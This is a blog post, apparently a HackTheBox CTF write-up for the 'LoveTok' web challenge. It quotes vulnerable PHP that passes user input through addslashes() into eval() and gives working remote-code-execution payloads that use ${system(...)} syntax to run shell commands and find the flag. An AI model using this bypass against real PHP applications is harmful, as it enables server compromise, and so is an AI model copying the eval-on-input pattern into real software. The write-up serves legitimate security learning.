<!DOCTYPE html><html lang="en"><head><meta http-equiv="content-type" content="text/html; charset=utf-8"><meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" name="viewport"><meta content="yes" name="apple-mobile-web-app-capable"><meta content="black-translucent" name="apple-mobile-web-app-status-bar-style"><meta content="telephone=no" name="format-detection"><meta name="description" content="æ‡’"><meta name="theme-color" content="#2d4356"><meta name="baidu-site-verification"><title>HackTheBox LoveTok WriteUP | å¿˜è¿”</title><link rel="stylesheet" type="text/css" href="/css/style.css"><link rel="Shortcut Icon" type="image/x-icon" href="/favicon.png"><link rel="stylesheet" href="//cdn.bootcss.com/font-awesome/4.7.0/css/font-awesome.min.css"><script type="text/javascript" src="//cdn.jsdelivr.net/npm/jquery@3.4.1/dist/jquery.min.js"></script><meta name="generator" content="Hexo 6.3.0"></head><link rel="stylesheet" type="text/css" href="/plugins/highlight/atom-one-dark.min.css"><script type="text/javascript" src="/plugins/highlight/highlight.min.js"></script><script>hljs.initHighlightingOnLoad();
</script><script type="text/javascript" src="/js/ready.js" async></script><link rel="stylesheet" href="//cdn.jsdelivr.net/gh/fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.css"><body class="night"><div class="mobile-head" id="mobile-head"><div class="navbar-icon"><span></span><span></span><span></span></div><div class="navbar-title"><a href="/">LITREILY</a></div><div class="navbar-search"><!--= show a circle here--></div></div><div class="h-wrapper" id="menu"><nav class="h-head box"><div class="m-hdimg"><a class="hdimg img" href="/"><img class="nofancybox" src="/img/profile.jpg" width="128" height="128"></a><h1 class="ttl"><a href="/">å¿˜è¿”</a></h1></div><p class="m-desc">ä¸”éšæˆ‘æç¯ç…§èƒ†çœ‹æ±Ÿå±±ã€‚</p><div class="m-nav"><ul><li><span class="dot">â—</span><a href="/archives/">å½’æ¡£</a></li><li><span class="dot">â—</span><a href="/tags/">æ ‡ç­¾</a></li><li><span class="dot">â—</span><a href="/about/">å…³äº</a></li><li><span class="dot">â—</span><a href="/links/">å‹é“¾</a></li><li><span class="dot">â—</span><a href="/Tips/">Tips</a></li><li class="m-sch"><form class="form" id="j-formsch" method="get"><input class="txt" type="text" id="local-search-input" name="q" value="æœç´¢" onfocus="if(this.value=='æœç´¢'){this.value='';}" onblur="if(this.value==''){this.value='æœç´¢';}"><input type="text" style="display:none;"></form></li></ul><div id="local-search-result"></div></div></nav></div><div id="back2Top"><a class="fa fa-arrow-up" title="Back to top" href="#"></a></div><div class="box" id="container"><div class="l-wrapper"><div class="l-content box"><div class="l-post l-post-art"><article class="p-art"><div class="p-header box"><h1 class="p-title">HackTheBox LoveTok WriteUP</h1><div class="p-info"><span class="p-date"><i class="fa fa-calendar"></i><a href="/2023/08/22/HackTheBox-LoveTok-WriteUP/">2023-08-22</a></span><span class="p-view" id="busuanzi_container_page_pv"><i class="fa fa-eye"></i><span id="busuanzi_value_page_pv"></span></span></div></div><div class="p-content"><h2 id="é¢˜ç›®"><a href="#é¢˜ç›®" class="headerlink" title="é¢˜ç›®"></a>é¢˜ç›®</h2><blockquote>
<p>True love is tough, and even harder to find. Once the sun has set, the lights close and the bell has rungâ€¦ you find yourself licking your wounds and contemplating human existence. You wish to have somebody important in your life to share the experiences that come with it, the good and the bad. This is why we made LoveTok, the brand new service that accurately predicts in the threshold of milliseconds when love will come knockinâ€™ (at your door). Come and check it out, but donâ€™t try to cheat love because love cheats back. ğŸ’›</p>
</blockquote>
<p><img src="/2023/08/22/HackTheBox-LoveTok-WriteUP/image.png" alt="LoveTok"></p>
<p><img src="/2023/08/22/HackTheBox-LoveTok-WriteUP/image-1.png" alt="Web"></p>
<h2 id="æ€è·¯"><a href="#æ€è·¯" class="headerlink" title="æ€è·¯"></a>æ€è·¯</h2><p>é¢˜ç›®æœ‰æºç ä¸‹è½½ï¼Œç†åº”æ˜¯ä»æºç ä¸­å¯»æ‰¾æ¼æ´äº†ã€‚<br>æ‰¾æ¥æ‰¾å»ï¼Œåªæœ‰<code>challenge/controllers/TimeController.php</code>ä¸­å­˜åœ¨å¯æ§å‚æ•°<code>$_GET[&#39;format&#39;]</code>ï¼š</p>
<pre><code class="php">&lt;?php
class TimeController
&#123;
    public function index($router)
    &#123;
        $format = isset($_GET[&#39;format&#39;]) ? $_GET[&#39;format&#39;] : &#39;r&#39;;
        $time = new TimeModel($format);
        return $router-&gt;view(&#39;index&#39;, [&#39;time&#39; =&gt; $time-&gt;getTime()]);
    &#125;
&#125;
</code></pre>
<p>è·Ÿè¸ªå®šä½åˆ°<code>TimeModel</code>ç±»ï¼Œä»£ç å¦‚ä¸‹ï¼š</p>
<pre><code class="php">&lt;?php
class TimeModel
&#123;
    public function __construct($format)
    &#123;
        $this-&gt;format = addslashes($format);

        [ $d, $h, $m, $s ] = [ rand(1, 6), rand(1, 23), rand(1, 59), rand(1, 69) ];
        $this-&gt;prediction = &quot;+$&#123;d&#125; day +$&#123;h&#125; hour +$&#123;m&#125; minute +$&#123;s&#125; second&quot;;
    &#125;

    public function getTime()
    &#123;
        eval(&#39;$time = date(&quot;&#39; . $this-&gt;format . &#39;&quot;, strtotime(&quot;&#39; . $this-&gt;prediction . &#39;&quot;));&#39;);
        return isset($time) ? $time : &#39;Something went terribly wrong&#39;;
    &#125;
&#125;
</code></pre>
<p>å¾ˆæ˜¾ç„¶ï¼Œè¦ç»•è¿‡<code>addslashes()</code>å‡½æ•°ï¼Œåˆ©ç”¨<code>getTime()</code>ä¸­çš„<code>eval()</code>æ¥RCEäº†ã€‚</p>
<h2 id="è§£é¢˜"><a href="#è§£é¢˜" class="headerlink" title="è§£é¢˜"></a>è§£é¢˜</h2><p>ä»£ç åœ¨<code>addslashes()</code>åæ²¡æœ‰å¯¹ä¼ å…¥çš„å‚æ•°åšå…¶ä»–å¤„ç†ï¼Œä¸å¥½é—­åˆåŒå¼•å·ã€‚</p>
<p>ä½†æ˜¯å¦‚æœä½¿ç”¨åŠ¨æ€å˜é‡çš„è¯ï¼Œå°±ä¸éœ€è¦é—­åˆåŒå¼•å·äº†ã€‚</p>
<blockquote>
<p>åœ¨ PHP ä¸­ï¼Œ{} ç”¨äºå¤æ‚çš„å˜é‡è§£æã€‚å½“å­—ç¬¦ä¸²ä¸­çš„å˜é‡åç§°ä¸å…¶ä»–å­—ç¬¦ç›¸é‚»å¹¶å¯èƒ½å¼•èµ·æ··æ·†æ—¶ï¼Œå¯ä»¥ä½¿ç”¨è¿™ç§è¯­æ³•æ¥æ˜ç¡®åœ°è¡¨ç¤ºå˜é‡åã€‚è€Œ ${} æ˜¯ä¸€ç§ç‰¹æ®Šçš„è¯­æ³•ï¼Œå®ƒå…è®¸ä½ é€šè¿‡ä¸€ä¸ªå­—ç¬¦ä¸²æ¥åŠ¨æ€åœ°ç”Ÿæˆå˜é‡åã€‚<br>â€”â€”ChatGPT</p>
</blockquote>
<p>Payloadå¦‚ä¸‹ï¼š</p>
<pre><code>GET /?format=r$&#123;$&#123;system(ls)&#125;&#125; HTTP/1.1
</code></pre>
<p><img src="/2023/08/22/HackTheBox-LoveTok-WriteUP/image-2.png" alt="ls"></p>
<p>ä½†æ˜¯<code>addslashes()</code>ä¼šå¯¹ç©ºæ ¼è¿›è¡Œå¤„ç†ï¼Œæˆ‘ä»¬ä¹Ÿå¹¶æ²¡æœ‰åœ¨å½“å‰ç›®å½•ä¸‹æ‰¾åˆ°flagï¼Œæ‰€ä»¥åˆ©ç”¨HTTPå‚æ•°ä¼ å…¥è¦æ‰§è¡Œçš„å‘½ä»¤ï¼Œæ˜¯ä¸ªå¥½ä¸»æ„ï¼š</p>
<pre><code>GET /?format=r$&#123;$&#123;system($_GET[aa])&#125;&#125;&amp;aa=ls%20/ HTTP/1.1
</code></pre>
<p><img src="/2023/08/22/HackTheBox-LoveTok-WriteUP/image-3.png" alt="ls /"></p>
<p>æ‰¾åˆ°<code>flag</code>:</p>
<p><img src="/2023/08/22/HackTheBox-LoveTok-WriteUP/image-4.png" alt="flag"></p>
<h2 id="å‚è€ƒèµ„æ–™"><a href="#å‚è€ƒèµ„æ–™" class="headerlink" title="å‚è€ƒèµ„æ–™"></a>å‚è€ƒèµ„æ–™</h2><blockquote>
<p><a target="_blank" rel="noopener" href="https://www.jianshu.com/p/7c818ddc5731">PHPå¤æ‚å˜é‡ç»•è¿‡addslashes()ç›´æ¥æ‹¿shell</a></p>
</blockquote>
</div><div class="p-copyright"><blockquote><div class="p-copyright-author"><span class="p-copyright-key">æœ¬æ–‡ä½œè€…ï¼š</span><span class="p-copytight-value"><a href="mailto:litreily@163.com">å¿˜è¿”</a></span></div><div class="p-copyright-link"><span class="p-copyright-key">æœ¬æ–‡é“¾æ¥ï¼š</span><span class="p-copytight-value"><a href="/2023/08/22/HackTheBox-LoveTok-WriteUP/">https://7mitu.github.io/2023/08/22/HackTheBox-LoveTok-WriteUP/</a></span></div><div class="p-copyright-note"><span class="p-copyright-key">ç‰ˆæƒå£°æ˜ï¼š</span><span class="p-copytight-value">æœ¬åšå®¢æ‰€æœ‰æ–‡ç« é™¤ç‰¹æ®Šå£°æ˜å¤–ï¼Œå‡é‡‡ç”¨<a rel="nofollow" target="_blank" href="https://creativecommons.org/licenses/by-nc/4.0/"> CC BY-NC 4.0 </a>è®¸å¯åè®®ã€‚è½¬è½½è¯·æ³¨æ˜å‡ºå¤„ <a href="https://7mitu.github.io">å¿˜è¿”çš„åšå®¢</a>ï¼</span></div></blockquote></div></article><div class="p-info box"><span class="p-tags"><i class="fa fa-tags"></i><a href="/tags/HackTheBox/">HackTheBox</a><a href="/tags/Web/">Web</a></span></div><aside id="toc"><div class="toc-title">ç›®å½•</div><nav><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%A2%98%E7%9B%AE"><span class="toc-number">1.</span> <span class="toc-text">é¢˜ç›®</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%80%9D%E8%B7%AF"><span class="toc-number">2.</span> <span class="toc-text">æ€è·¯</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%A7%A3%E9%A2%98"><span class="toc-number">3.</span> <span class="toc-text">è§£é¢˜</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8F%82%E8%80%83%E8%B5%84%E6%96%99"><span class="toc-number">4.</span> <span class="toc-text">å‚è€ƒèµ„æ–™</span></a></li></ol></nav></aside></div><section class="p-ext"><div class="l-pager l-pager-dtl box"><a class="prev" href="/2023/08/22/HackTheBox-WeatherAPP-WriteUP/">&lt; HackTheBox WeatherAPP WriteUP</a><a class="next" href="/2023/08/22/HackTheBox_PhoneBook_WriteUP/">HackTheBox PhoneBook WriteUP &gt;</a></div></section><footer><p>Copyright Â© 2016 - 2023 <a href="/." rel="nofollow">å¿˜è¿”</a> | <strong><a rel="nofollow" target="_blank" href="https://creativecommons.org/licenses/by-nc/4.0/">CC BY-NC 4.0</a></strong><br><span id="busuanzi_container_site_uv"><i class="fa fa-user"></i><span id="busuanzi_value_site_uv"></span></span> <span id="busuanzi_container_site_pv"><i class="fa fa-eye"></i><span id="busuanzi_value_site_pv"></span></span> | Powered by<a rel="nofollow" target="_blank" href="https://hexo.io"> Hexo.</a>Theme with<a rel="nofollow" target="_blank" href="https://github.com/litreily/snark-hexo"> snark.</a></p></footer></div></div></div><script type="text/javascript" src="/js/search.js"></script><script type="text/javascript" src="/js/top.js"></script><script type="text/javascript" src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" async></script><script>var search_path = 'search.xml';
if (search_path.length == 0) {
    search_path = 'search.xml';
}
var path = '/' + search_path;
searchFunc(path, 'local-search-input', 'local-search-result');
</script><script type="text/javascript" src="//cdn.jsdelivr.net/gh/fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.js"></script><script type="text/javascript" src="/js/fancybox.js?v=0.0.1" async></script></body></html>